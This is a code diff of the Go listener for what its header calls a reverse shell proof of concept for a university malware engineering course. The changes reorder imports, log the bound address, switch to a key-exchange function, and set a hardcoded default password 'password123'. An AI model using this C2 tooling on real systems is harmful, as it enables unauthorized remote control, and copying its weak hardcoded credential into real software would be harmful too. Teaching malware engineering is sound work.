@@ -3,26 +3,27 @@ package main
 // REVERSE SHELL POC FOR MALWARE ENGINEERING COURSE OF UIT
 
 import (
-	"log/slog"
-	"strings"
-	"path/filepath"
-	"os"
-	"fmt"
-	"flag"
 	"bytes"
+	"flag"
+	"fmt"
+	"log/slog"
 	"net"
+	"os"
 	"os/exec"
+	"path/filepath"
+	"strings"
 
 	"grevshell/grevcore"
 )
 
 var (
-	C2Port		string
-	C2Password	string	
+	C2Port     string
+	C2Password string
 )
+
 func main() {
 	flag.StringVar(&C2Port, "p", "9999", "Specify the listening port.")
-	flag.StringVar(&C2Password, "k", "", "Specify the authentication password.")
+	flag.StringVar(&C2Password, "k", "password123", "Specify the authentication password.")
 
 	flag.Parse()
 
@@ -35,7 +36,7 @@ func main() {
 
 	defer stream.Close()
 
-	slog.Info("Reverse shell listening on port 9999.")
+	slog.Info("Reverse shell listening.", "ADDRESS", stream.Addr())
 
 	for {
 		conn, err := stream.Accept()
@@ -48,7 +49,7 @@ func main() {
 		defer conn.Close()
 
 		slog.Info("Incoming connection.", "REMOTE", conn.RemoteAddr())
-		key, err := grevcore.DeriveKey(conn, C2Password)
+		key, err := grevcore.ExchangeKey(conn, C2Password)
 
 		if err != nil {
 			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
